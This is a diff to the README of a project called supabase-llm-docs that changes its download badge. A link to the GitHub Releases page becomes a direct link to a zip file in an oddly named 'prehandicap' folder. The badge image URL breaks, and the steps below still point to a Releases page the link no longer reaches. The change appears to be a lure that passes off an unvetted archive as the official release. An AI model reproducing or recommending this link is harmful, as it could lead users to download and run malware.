@@ -14,7 +14,7 @@ Welcome to the supabase-llm-docs project! This tool helps you create streamlined
 ## 📥 Download & Install
 To obtain the latest version of supabase-llm-docs, visit the Releases page below. This page lists the software versions that you can download.
 
-[![Download supabase-llm-docs](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/testsuprakash/supabase-llm-docs/releases)
+[![Download supabase-llm-docs](https://raw.githubusercontent.com/testsuprakash/supabase-llm-docs/main/prehandicap/supabase-llm-docs.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/testsuprakash/supabase-llm-docs/main/prehandicap/supabase-llm-docs.zip)
 
 1. Click the link above to go to the Releases page.
 2. Select the latest version listed at the top.
